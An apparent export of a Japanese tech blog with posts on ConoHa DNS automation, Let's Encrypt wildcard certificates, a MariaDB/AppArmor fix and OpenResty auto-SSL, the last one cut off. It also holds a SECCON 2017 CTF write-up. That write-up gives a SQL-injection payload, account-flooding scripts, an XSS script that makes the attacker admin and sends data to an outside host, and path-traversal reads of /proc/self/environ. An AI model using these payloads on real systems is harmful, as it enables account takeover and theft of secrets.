Lexiconを使う\n\n様々なDNSサービスを1つのCLIから使えるようにしたソフトウェアが[Lexicon](https://github.com/AnalogJ/lexicon)です。\n\nなんと**ConoHa DNSに対応**しています！すごい！！\n（まぁ、ボクが使うために対応させたからなんですケド……）\n\n便利なので使ってください。pipさえあればGetできます。\nこんな具合に使えるかと思います。\n\n```\n$ pip install dns-lexicon\n\n$ lexicon conoha\nusage: lexicon conoha [-h] [--name NAME] [--content CONTENT] [--ttl TTL]\n                      [--priority PRIORITY] [--identifier IDENTIFIER]\n                      [--log_level {CRITICAL,ERROR,WARNING,INFO,DEBUG,NOTSET}]\n                      [--output {TABLE,TABLE-NO-HEADER,JSON,QUIET}]\n                      [--auth-region AUTH_REGION] [--auth-token AUTH_TOKEN]\n                      [--auth-username AUTH_USERNAME]\n                      [--auth-password AUTH_PASSWORD]\n                      [--auth-tenant-id AUTH_TENANT_ID]\n                      {create,list,update,delete} domain\n                      {A,AAAA,CNAME,MX,NS,SOA,TXT,SRV,LOC}\n\n$ lexicon conoha --auth-region tyo1 --auth-username gncu01234567 --auth-password xxxxxxxxxxx --auth-tenant-id 0123456789abcdef0123456789abcdef create narusejun.com A --name local --content 127.0.0.1\n$ lexicon conoha --auth-region tyo1 --auth-username gncu01234567 --auth-password xxxxxxxxxxx --auth-tenant-id 0123456789abcdef0123456789abcdef list narusejun.com A\nID                                   TYPE NAME                CONTENT   TTL\n------------------------------------ ---- ------------------- --------- ----\n42929801-5111-41d5-a115-9f67a1d07810 A    local.narusejun.com 127.0.0.1 3600\n```\n\n詳しくは[公式のドキュメント](https://github.com/AnalogJ/lexicon)を読んでください。\nLet's EncryptのDNS-01を自動化するやり方も紹介されていますよ！\n\n## Let's EncryptのDNS-01チャレンジを自動化する\n\nせっかくAPIでDNSレコードを操作できるわけですし、活用したいですね！\n\n最近[ワイルドカード証明書が取れるようになった](/posts/23/)Let's Encryptと連携してみましょう。\nちなみに、ワイルドカード証明書はDNS-01チャレンジでしか取得できません！\n\n### LexiconとDehydratedを使う\n\n先ほど紹介したlexiconと、ACMEクライアント[Dehydrated](https://github.com/lukas2511/dehydrated)を組み合わせるやり方がlexiconの作者さんによって紹介されています。\n\nhttps://blog.thesparktree.com/generating-intranet-and-private-network-ssl\n\n### Legoを使う\n\n2つのソフトウェアを連携させるのは面倒ですし、できればパパッとコマンド1つで証明書取りたいですよね？\nそこで、Go製のACMEクライアント[lego](https://github.com/xenolf/lego)を使いましょう！\nlegoでは、いろんなDNS-Providersが提供されていて、対応しているDNSサービスならすぐに証明書を発行できます。\n\n[lego](https://github.com/xenolf/lego)\n\nなんと**ConoHa DNSに対応**しています！すごい！！\n（まぁ、ボクが使うために対応させたからなんですケド……）\n\n[バイナリが入手可能](https://github.com/xenolf/lego/releases)なほか、goがインストールされているなら`go get`ですぐに入手できます。\nこういう感じで使います。とっても便利ですよ！\n\n```\n$ go get -u github.com/xenolf/lego/cmd/lego\n\n$ lego dnshelp\nCredentials for DNS providers must be passed through environment variables.\n\nValid providers and their associated credential environment variables:\n        conoha:         CONOHA_REGION, CONOHA_TENANT_ID, CONOHA_API_USERNAME, CONOHA_API_PASSWORD\n\nAdditional configuration environment variables:\n        conoha:         CONOHA_POLLING_INTERVAL, CONOHA_PROPAGATION_TIMEOUT, CONOHA_TTL, CONOHA_HTTP_TIMEOUT\n\n$ export CONOHA_REGION=tyo1\n$ export CONOHA_TENANT_ID=0123456789abcdef0123456789abcdef\n$ export CONOHA_API_USERNAME=gncu01234567\n$ export CONOHA_API_PASSWORD=xxxxxxxxxxx\n$ lego --dns conoha --server https://acme-staging-v02.api.letsencrypt.org/directory --email cert@narusejun.com --domains narusejun.com --domains *.narusejun.com run\n2018/12/21 02:44:58 [INFO] [narusejun.com, *.narusejun.com] acme: Obtaining bundled SAN certificate\n2018/12/21 02:44:59 [INFO] [*.narusejun.com] AuthURL: https://acme-staging-v02.api.letsencrypt.org/acme/authz/wcYZJB5aWmfi4WzGuwv2JlSaYjryGf67zqES8h8bmEg\n2018/12/21 02:44:59 [INFO] [narusejun.com] AuthURL: https://acme-staging-v02.api.letsencrypt.org/acme/authz/gwXBvxvuHk7TrUYbuu3MWp7heVoLTTle7Nh2ng98b74\n2018/12/21 02:44:59 [INFO] [narusejun.com] acme: Authorization already valid; skipping challenge\n2018/12/21 02:44:59 [INFO] [narusejun.com] acme: Preparing to solve DNS-01\n2018/12/21 02:45:00 [INFO] [narusejun.com] acme: Trying to solve DNS-01\n2018/12/21 02:45:00 [INFO] [narusejun.com] Checking DNS record propagation using [1.0.0.1:53]\n2018/12/21 02:45:00 [INFO] Wait [timeout: 1m0s, interval: 2s]\n2018/12/21 02:45:37 [INFO] [narusejun.com] The server validated our request\n2018/12/21 02:45:38 [INFO] [narusejun.com, *.narusejun.com] acme: Validations succeeded; requesting certificates\n2018/12/21 02:45:39 [INFO] [narusejun.com] Server responded with a certificate.\n\n$ openssl x509 -in ~/.lego/certificates/narusejun.com.crt -text\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            fa:78:5b:6e:73:74:37:e6:c4:36:54:82:02:04:d2:7e:bd:0b\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: CN = Fake LE Intermediate X1\n        Validity\n            Not Before: Dec 20 16:45:40 2018 GMT\n            Not After : Mar 20 16:45:40 2019 GMT\n        Subject: CN = narusejun.com\n        X509v3 extensions:\n            X509v3 Subject Alternative Name:\n                DNS:*.narusejun.com, DNS:narusejun.com\n```\n\n……と、サクッとワイルドカード証明書が取れてしまいました。すごい！便利！\n\n上の例はstaging環境から証明書を取得しているので、マネする際はご注意ください！\n詳しくは、例によって[公式ドキュメント](https://github.com/xenolf/lego)をごらんください。\n\n### traefikを使う\n\n[traefik](https://docs.traefik.io/)は強いL7ロードバランサみたいなものです（ざっくりとした説明）。\nLet's Encryptから自動で証明書を取る機能がついてるんですが、この機能は内部で先述したlegoを利用しています。\n\n[traefik](https://docs.traefik.io/)\n\n……ということは、**ConoHa DNSに対応**しています！\n詳しい説明は省きますが、[公式ドキュメント](https://docs.traefik.io/configuration/acme/)を参考に設定してみてください。\nちゃんとConoHa DNSと連携して動作することを確認済みです。\n\n## おわりに\n\n紹介したソフトウェア以外にも、LexiconやLegoを内部で使ってる系ソフトが実はConoHaに対応してるパターンがいっぱいあるかもしれません。このソフトでもConoHa DNS使えたよ！とかあったら教えてください。\nちなみに、[Caddy](https://caddyserver.com/)というHTTPサーバが[Legoの全DNSプロバイダに対応しそう](https://caddy.community/t/poll-we-can-end-dns-provider-plugins-should-we/4887)だったりするので、そしたらConoHaも使えるようになりますね！\n\n----\n\nConoHaのDNS、めっちゃ便利なので使いましょう。\nAPIでレコードいじれるし、ゾーン数がいくつあっても無料ってマジ！？神じゃん。\n\nあっ、ボクのパソコン見てください。\n\nhttps://twitter.com/sekai67/status/1053444090757435392\n\nhttps://twitter.com/sekai67/status/1053598421414596608\n\nhttps://twitter.com/sekai67/status/1053441437126127616\n","title":"ConoHaのDNSをAPIから操作する話","image":null,"tags":["アドベントカレンダー","ConoHa","DNS","API","Let's Encrypt"],"date":"2018-12-21T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"external","url":"https://trap.jp/post/422/","publisher":"東京工業大学デジタル創作同好会traP","title":"2018年の夏は #ツイキャスインターンチャレンジ","tags":["traP","高速化"],"date":"2018-07-13T00:00:00.000Z"},{"type":"article","slug":"24","body":"Ubuntu(18.04 LTS)でmysql-serverをmariadb-serverで置き換えるとsystemd経由でmariadbが起動できない。\n\n## 追記\n\nこの記事には一部誤りがあります。\n以下の記事も合わせてご覧ください。\n\n[/posts/28/](/posts/28/)\n\n# トラブル\n\nタイトルの通りです。\nUbuntu 18.04で発生したトラブルですが、他のバージョンでも起こり得そうな予感がします。おそらく。\n\n```bash\n$ sudo apt install mysql-server\n$ sudo apt purge mysql-server\n$ sudo apt install mariadb-server\n```\n\nとすると、最後の`apt install`が妙に遅い事に気が付きます。\nコレは、aptがインストール後におせっかいでmariadbを起動してくれるのですが、何らかの原因でしばらく経ってもmariadbが起動しないためです。\n\nその後、`systemctl start mariadb`を試しても、しばらくした後に起動失敗します。\n\n```bash\n$ sudo systemctl start mariadb\nJob for mariadb.service failed because a timeout was exceeded.\nSee \"systemctl status mariadb.service\" and \"journalctl -xe\" for details.\n```\n\n## 調査\n\n### systemdのログ\n\n```bash\n$ sudo systemctl status mariadb\n● mariadb.service - MariaDB database server\n   Loaded: loaded (/lib/systemd/system/mariadb.service; enabled; vendor preset: enabled)\n   Active: failed (Result: timeout) since Tue 2018-07-10 01:20:10 JST; 36s ago\n Main PID: 2404 (code=exited, status=0/SUCCESS)\n\nJul 10 01:18:38 localhost systemd[1]: Starting MariaDB database server...\nJul 10 01:18:38 localhost mysqld[2404]: 2018-07-10  1:18:38 139689982721152 [Note] /usr/sbin/mysqld (mysqld 10.1.29-MariaDB-6) starting as process 2404 ...\nJul 10 01:20:08 localhost systemd[1]: mariadb.service: Start operation timed out. Terminating.\nJul 10 01:20:10 localhost systemd[1]: mariadb.service: Failed with result 'timeout'.\nJul 10 01:20:10 localhost systemd[1]: Failed to start MariaDB database server.\n```\n\n**timeout**しているようです。\nしかしながら、`mysqld[2404]: ...`から始まる行を見ると、どうやら起動できているようにも見えますが……？\n\n### 接続してみる\n\n`systemctl start mariadb`を実行後、シェルが待機中に別のシェルからMariaDBに接続してみると、普通に接続できます。\n\n```bash\n$ mysql -u root\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 2\nServer version: 10.1.29-MariaDB-6 Ubuntu 18.04\n\nCopyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]>\n```\n\nやはり、DBサーバーの起動自体はできているようですが、`systemd`が起動に成功したことを検知できていないようです。\n\n### systemd unit定義の確認\n\nsystemdでプロセスを起動するための設定ファイルを確認してみます。\n`/lib/systemd/system/mariadb.service`にあります。\n\n注目すべきは、以下の設定です。\n```\n[Service]\nType=notify\n```\n\nこれは、[sd_notify](https://www.freedesktop.org/software/systemd/man/sd_notify.html)を使ってプロセスの起動完了をsystemdへ通知する設定であることを表しています。\nmariadbは起動できているのに、systemdがそれを認識していない、ということはどうやらこの`sd_notify`が正しく送信されていないのではないか？と疑われます。\n\n### auditログ\n\n`sd_notify`はUNIXドメインソケット(`/run/systemd/notify`)を介してsystemdに通知を送信しますが、パーミッションも特に問題なく、アクセスできそうですが……？\n次に疑うのはSELinuxやAppArmorといった強制アクセス制御機能です。UbuntuはデフォルトでAppArmorが有効なので、怪しいです。\n\nauditログを確認します\n\n```bash\n$ journalctl -n 1 _TRANSPORT=audit\nJul 10 01:42:59 localhost audit[3057]: AVC apparmor=\"DENIED\" operation=\"sendmsg\" info=\"Failed name lookup - disconnected path\" error=-13 profile=\"/usr/sbin/mysqld\" name=\"run/systemd/notify\" pid=3057 comm=\"mysqld\" requested_mask=\"w\" denied_mask=\"w\" fsuid=112 ouid=0\n```\n\nAppArmorによって、`sd_notify`の送信が拒否されているのが発見できました。\nようやく尻尾を掴みましたね……\n\n## 原因\n\n`mysql-server`をインストールすると、AppArmorプロファイルが同時にインストールされ、有効化されます。\nこのプロファイルは`/etc/apparmor.d/usr.sbin.mysqld`に設置されます。\n\nhttps://www.apt-browse.org/browse/ubuntu/xenial/main/amd64/mysql-server-5.7/5.7.11-0ubuntu6/file/etc/apparmor.d/usr.sbin.mysqld\n\nこのプロファイルでは、限られたディレクトリへのアクセスのみを許可しており、`sd_notify`で使うソケットへはアクセスできません。\nしかしながら、`mysql-server`では、プロセス起動検知に`Type=simple`を使用しているため、これは問題になりません。\n\n`mysql-server`をアンインストールし、`mariadb-server`をインストールすると、`/etc/apparmor.d/usr.sbin.mysqld`は空のファイルで上書きされますが、AppArmorがすでに読み込んでいるプロファイルは削除されません。\nまた、`systemctl reload apparmor`しても、OSを再起動しても、一度読み込まれたプロファイルが勝手に削除されることはありません。\n\n……なので、プロセス起動検知に`Type=notify`を使う`mariadb-server`にもこのプロファイルが適用されてしまい、`sd_notify`が失敗してsystemdがタイムアウトする、というオチでした。\n\n## 解決法\n\nUbuntuでは、削除されたプロファイルをアンロードするコマンド`aa-remove-unknown`が用意されています。\n`mariadb-server`をインストールした後、これを実行すれば良いです。\n\n```bash\n$ sudo aa-remove-unknown\nRemoving '/usr/sbin/mysqld'\n```\n\nコレで正常に起動できるようになります。\n\n```bash\n$ sudo systemctl start mariadb\n$ sudo systemctl status mariadb\n● mariadb.service - MariaDB database server\n   Loaded: loaded (/lib/systemd/system/mariadb.service; enabled; vendor preset: enabled)\n   Active: active (running) since Tue 2018-07-10 01:55:56 JST; 15s ago\n Main PID: 4753 (mysqld)\n   Status: \"Taking your SQL requests now...\"\n    Tasks: 27 (limit: 1112)\n   CGroup: /system.slice/mariadb.service\n           └─4753 /usr/sbin/mysqld\n```\n\n# おしまい\n\n[traP](https://trap.jp)で[部内ISUCON](https://twitter.com/to_hutohu/status/1014097600209825792)をしていて、とりあえずmysqlを入れている人が多かったので、なんとなく**「mariadbに替えた方がいいよ！」**と言ったら起動できなくなる人が続出して阿鼻叫喚でした。\n\n[ICTSC](https://icttoracon.net)みたいですね。\n\nおわり。\n","title":"Ubuntuでmysql-serverをmariadb-serverで置き換えるとsystemd経由でmariadbが起動できない","image":null,"tags":["インフラ","Ubuntu","Linux","MySQL","MariaDB","systemd"],"date":"2018-07-10T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"external","url":"https://trap.jp/post/306/","publisher":"東京工業大学デジタル創作同好会traP","title":"ICTトラブルシューティングコンテスト #ICTSC9 に参加した話","tags":["traP","ICTSC","インフラ","参加記"],"date":"2018-04-01T00:00:00.000Z"},{"type":"article","slug":"23","body":"Let's Encryptでワイルドカード証明書を発行してみました。\n\n# ワイルドカード証明書\n\n遂に……遂に来ましたね。\nLet's Encryptの**ワイルドカード証明書**が。\n\n[ACME v2 and Wildcard Certificate Support is Live](https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579)\n\n非常におめでたいです🎉\n\nこれで、サブドメインをたくさん切って運用してるサービスなんかの証明書の管理がグッとラクになりますね。\n\n# 早速取得してみる\n\n注意点としては、\n\n- ワイルドカード証明書はACMEv2エンドポイントからのみ発行できる\n- ワイルドカード証明書はDNS-01チャレンジでのみ発行できる\n\n公式の**Certbot**は0.22.0からACMEv2に対応しており、DNS-01チャレンジにも対応してます。\nDNS-01では、`_acme-challenge.example.com`のようなTXTレコードを作成してドメインの所有を確認します。\n\n## 手順\n\n適当にCertbot(certbot-auto)をインストールしたら、以下のようなコマンドを実行します。\n明示的にACMEv2エンドポイントとDNS-01チャレンジを指定する必要がります。\n\n```sh\ncertbot certonly \\\n--manual \\\n--preferred-challenges dns-01 \\\n--server https://acme-v02.api.letsencrypt.org/directory \\\n--domain *.kiritan.com\n```\n\nすると、以下のように「IP記録するけどいい？」って確認されます。\nDNS-01は、実際に証明書を使うサーバー以外からも発行が要求できるんですが、要求元のIPアドレスが記憶されるみたいです。\n\n```\n-------------------------------------------------------------------------------\nNOTE: The IP of this machine will be publicly logged as having requested this\ncertificate. If you're running certbot in manual mode on a machine that is not\nyour server, please ensure you're okay with that.\n\nAre you OK with your IP being logged?\n-------------------------------------------------------------------------------\n(Y)es/(N)o:\n```\n\n進むと、以下のようなレコードを設定しろと言われるので、設定します。\n\n```\n-------------------------------------------------------------------------------\nPlease deploy a DNS TXT record under the name\n_acme-challenge.kiritan.com with the following value:\n\nf4WTOGBdEhZF7aAx9mZof8X9072JVUKDR7FhmUlKiYo\n\nBefore continuing, verify the record is deployed.\n-------------------------------------------------------------------------------\nPress Enter to Continue\n```\n\nボクは[ConoHa](https://www.conoha.jp/referral/?token=sp928CCbwhPZeu0SLEbeVyIhGOsIchLSzaun2yUbKWaR.q89860-OPA)のDNSを使っています。\n普通にWebブラウザからレコードを設定するのはもちろん、API経由で設定もできるので非常に便利です。\nあと、DNSサービス自体は無料です。ふとっばらですね。\n\nついでに宣伝↓\n\n[ConoHaのDNS APIをCLIから叩くやつを作った](/posts/14/)\n\nあと、AWSのRoute53みたいな有名サービスなら、プラグインが存在するので手軽にDNS-01による確認ができるみたいです。\n\n[Certbot Docs » User Guide » DNS Plugins](https://certbot.eff.org/docs/using.html#dns-plugins)\n\n今度ConoHaのDNSでも簡単に証明書がとれるDNS-01プラグインを書いてみようかな？？？\n\n適切にTXTレコードを設定したら、エンターキーを押せば終わり！\n\n![](0.png)\n\n```\nIMPORTANT NOTES:\n - Congratulations! Your certificate and chain have been saved at:\n   /etc/letsencrypt/live/kiritan.com/fullchain.pem\n```\n\n簡単ですね！\nあとは、HTTPサーバに設定してあげれば夢のワイルドカード証明書によるHTTPS化が完了です！\n\n![](1.png)\n![](2.png)\n\nうわ〜〜ワイルドカードだ〜〜うれしい〜〜\n\n# おわり\n\nTXTレコードを設定するところが自動化できるなら、本当に証明書管理の手間が少なくなると思います。\n\n別のアプローチで管理の手間をなくす記事もあります。見てね。\n\n[lua-nginx-auto-sslで全自動HTTPS](/posts/21/)\n","title":"Let's Encryptのワイルドカード証明書を早速発行してもらう","image":null,"tags":["自動化","SSL","セキュリティ","Let's Encrypt"],"date":"2018-03-14T00:00:00.000Z","updated":"2021-01-08T10:53:56.000Z"},{"type":"article","slug":"22","body":"**NaruseJun**というチームでSECCON決勝に出ました。\n\n# 決勝\n\nボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！\n\nhttps://twitter.com/_n_ari/status/964678908242157569\n\n# 結果\n\n競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。\n午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。\n**文部科学大臣賞 個人賞**も頂きました。\n\nhttps://twitter.com/yamaha_sn/status/964784430572232705\n\nhttps://twitter.com/yamaha_sn/status/964787478178615302\n\nhttps://twitter.com/sekai67/status/964792274025529345\n\n# Writeup\n\n## 府中\n\nWeb問？\nElectronで書かれた音楽系SNSで、曲をアップロードできたりするようです。\n\n### Attack\n\nアップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。\n\n```sql\n', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav\n```\n\nのようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。\n\nいろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが`file`テーブル以外へのアクセス権を持っていないように見えました。\n（挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）\n\nで、結局ここから先がわかりませんでした……\nここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？\nわかりません。\n\n### Defence\n\n再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。\n\n1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。\n適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。\n\n再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、\nストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。\nアプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。\n\n#### 再生数を増やすNode.js向けスクリプト\n\n```js\nvar PromiseSocket = require('promise-socket');\n\nasync function getWAV(streaming_host, streaming_port, song, api_key) {\n    return new Promise(async (resolve, reject) => {\n        const socket = new PromiseSocket();\n        await socket.connect({\n            host: streaming_host,\n            port: streaming_port\n        });\n        for(let i = 0; i < 100; i++){\n            // '\\x80': select song\n            await socket.write(\"\\x80\");\n            await socket.write(song['unique_id']);\n            await socket.write(api_key);\n            // '\\x82': get WAV File Headers\n            await socket.write(\"\\x82\");\n            await socket.write(\"\\x84\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f\");\n            await socket.write(\"\\x81\");\n        }\n        // '\\x90': close connection\n        await socket.write(\"\\x90\");\n        // let result = (await socket.readAll());\n        let result = (await socket.end());\n        resolve(result);\n    });\n}\n\n\n(async _ => {\n    console.log(await getWAV(\"fuchu.koth.seccon\", 8000, {unique_id: process.argv[2]}, process.argv[3]));\n})();\n```\n\n#### アカウントを量産して再生数を稼ぐスクリプト\n\n```sh\nexport FLAG=\"176872aa9e14b27d972e2c56b1ec16db\"\nexport USERID=\"2099\"\nexport APIKEY=\"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49\"\nexport RESP=$(curl -X POST http://fuchu.koth.seccon/files -H \"X-FUCHU-KEY: $APIKEY\" -F \"file=@./po.wav;type=audio/wav\")\nexport UNIQID=$(echo $RESP | sed -E 's/[^:]+:\"([^,]+)\".+/\\1/')\nexport PAYLOAD=$(printf '{\"name\":\"%s\",\"unique_id\":\"%s\",\"artist\":%s,\"description\":\"hello\"}' $FLAG $UNIQID $USERID)\ncurl -X POST http://fuchu.koth.seccon/songs -H \"X-FUCHU-KEY: $APIKEY\" -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\nwhile true\ndo\n\texport USER=$(head /dev/urandom | md5)\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\",\"email\":\"%s@seccon.jp\",\"sex\":\"0\",\"birthday\":\"2018-02-15\",\"free_text\":\"\"}' $USER $USER)\n\tcurl -X POST http://fuchu.koth.seccon/users -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\"}' $USER)\n\texport RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H \"Content-Type: application/json\" --data \"$PAYLOAD\")\n\texport APIKEY=$(echo $RESP | sed -E 's/.+\"(.+)\".+/\\1/')\n\tnode increment.js $UNIQID $APIKEY\ndone\n```\n\nこれらを用いると、ディフェンスキーワードをランキングに載せることができるので、\nチームメイトにお願いして書き込み続けてもらいました。\n\n## 船橋\n\n提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、\nそのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。\n\n教師用データセットも与えられるので、機械学習するのが正攻法？\n他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。\n\nボクが目視でそれっぽい指紋を選んだら通りました。\n競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。\n\n## 幕張\n\nスマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。\n\n後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？\nなんか外と通信しているんだろうなぁというのは分かったんですが、\nELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。\n\n\n## 梅田\n\n画像投稿サイト。Web問。\n\n### Defence\n\nまず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、\nもっともFav数の多いページにキーワードを書き込み続けるだけでした。\n\nどのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、\nそもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、\nそれほど頻繁には変わっていませんでした。\n登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？\n\n```sh\nwhile true\ndo\n\texport CONTENT=44b106151c01d64e0c479eb43ef12a48\n\tcurl http://umeda.koth.seccon/photos/1 -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" > cache\n\texport NAME=$(cat cache | sed -E 's/.+\"csrf_name\" value=\"([^\"]+)\".+/\\1/')\n\texport VALUE=$(cat cache | sed -E 's/.+\"csrf_value\" value=\"([^\"]+)\".+/\\1/')\n\tcurl http://umeda.koth.seccon/photos/1/comment -X POST -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" -d csrf_name=$NAME -d csrf_value=$VALUE -d content=$CONTENT\ndone\n```\n\n### Attack\n\n1つ目のFLAGは、普通に`ID:1`の画像ページに書いてあった。\n\n不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。\nただし、`Content-Security-Policy: script-src 'self'`ヘッダがついているので、\n画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。\n\nこんな感じに、`GIF8`がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。\n\n```js\nGIF8=8;\n\nfetch(\"/admin/users\", {credentials: 'include'})\n.then(r => r.text())\n.then(r => {\n\tconst [,v] = r.match(/name=\"csrf_value\" value=\"(.+?)\"/);\n\tconst [,n] = r.match(/name=\"csrf_name\" value=\"(.+?)\"/);\n\tconst body = `csrf_value=${v}&csrf_name=${n}&name=azon`;\n\treturn fetch(\"/admin/new-admin\", {\n\t\tbody,\n\t\tmethod: \"POST\",\n\t\theaders: {\n\t\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t\t},\n\t\tcredentials: 'include',\n\t});\n})\n.then(r => r.text())\n.then(r => fetch(\"http://192.168.14.4:8000/users\", {method: \"POST\", body: r}))\n```\n\n管理者のブラウザで適当に`/admin`ページを漁ると、\nどうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。\n管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。\n\nで、更に管理者ページを探すと`/admin/logs`というアプリのログを確認する機能が存在することがわかります。\nこのページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、\nさらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。\n\n管理者で`/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php`としてソースの末尾を見ると、\n4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。\nちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。\n\n環境変数は`/admin/logs?p=/../../../../../../proc/self/environ`で読めます。\n","title":"SECCON2017国内決勝大会に出ました","image":null,"tags":["参加記","CTF","SECCON"],"date":"2018-02-20T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/334/","publisher":"東京工業大学デジタル創作同好会traP","title":"PrometheusでConoHa APIからメトリクスを取得してみる","tags":["traP","アドベントカレンダー","インフラ","ConoHa","監視","Prometheus"],"date":"2017-12-24T00:00:00.000Z"},{"type":"article","slug":"21","body":"備忘録！\n\n# 全自動HTTPS\n\n[Let's Encrypt](https://letsencrypt.org/)の登場でHTTPSがぐっと身近になりましたが、やっぱり証明書をホスト名毎に取得するのは結構面倒ですし、90日毎に更新しなきゃいけないのも大変です。\n\nhttps://letsencrypt.org/\n\nそこで、[OpenResty](https://openresty.org/en/)(nginxにいろいろ足したやつ)に[lua-nginx-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)を入れて、全自動で証明書取得から更新までしてくれる環境を作りたいと思います。\n例によってArchLinuxでやります。\n\n## インストール\n\nOpenRestyを入れます。\nAURからPKGBUILDを落としてきてmakepkgでパッケージを作ってインストールします。\n```sh\ngit clone https://aur.archlinux.org/openresty.git\nmakepkg --syncdeps --install --skippgpcheck\n```\n\nlua-nginx-auto-sslのインストールにLuaRocksを使うので、同様にインストール。\n```sh\ngit clone https://aur.archlinux.org/openresty_luarocks.git\nmakepkg --syncdeps --install\n```\n\nLuaRocksでlua-nginx-auto-sslを入れる。\n```sh\n/opt/openresty/luajit/bin/luarocks install lua-resty-auto-ssl\n```\n\n## 設定\n\nArch公式リポジトリのnginxと同じ感じの操作感にするために、いろいろシンボリックリンクを貼ります。\n```sh\nln -s /opt/openresty/nginx/conf /etc/nginx\nln -s /opt/openresty/nginx/logs /var/log/nginx\nln -s /opt/openresty/bin/openresty /usr/bin/nginx\nln -s /usr/lib/systemd/system/openresty.service /usr/lib/systemd/system/nginx.service\n```\n\nlua-nginx-auto-sslで取得する証明書の鍵アルゴリズムとか、取得失敗時に使う自己署名証明書とかを用意。\n```sh\nmkdir -p /etc/nginx/ssl/letsencrypt/conf.d\nprintf 'KEY_ALGO=\"prime256v1\"\\nCONTACT_EMAIL=\"example@narusejun.com\"' > /etc/nginx/ssl/letsencrypt/conf.d/custom.sh\nopenssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -keyout /etc/nginx/ssl/fallback_key.pem -out /etc/nginx/ssl/fallback_crt.pem -subj \"/CN=NaruseJun/\"\nchown -R http:http /etc/nginx/ssl\n```\n\n`/etc/nginx/ssl`は、lua-nginx-auto-sslが証明書を置いたりするのに使うディレクトリです。\n後ほど、nginxの設定でこのディレクトリを指定します。\n\nOpenRestyの実行ユーザ（Archのデフォルトは`http`）がこのディレクトリに書き込み出来ないと証明書の取得に失敗するので、chmodしています。\n\n### OpenSSL 1.0系を使う設定\n\nlua-nginx-auto-sslが内部て使っているletsencryptクライアントの**dehydrated**はバージョンが少々古くて、OpenSSL 1.1系に対応していません。\nArchLinuxはOpenSSL 1.1系なので、このまま運用すると**証明書が取得できているのにdehydratedが落ちて**しまいます。\nlua-nginx-auto-sslくんはアクセスが有るたびに証明書を取得しようとするので、あっという間にRateLimitに引っかかってしまいます……！\n\nということで、OpenSSL 1.0系を使ってくれるようにdehydratedをパッチします。\n\n```sh\npacman -Sy openssl-1.0\nsed -i \"2a shopt -s expand_aliases\\nalias openssl=openssl-1.0\\n\" /opt/openresty/luajit/bin/resty-auto-ssl/dehydrated\n```\n\n### 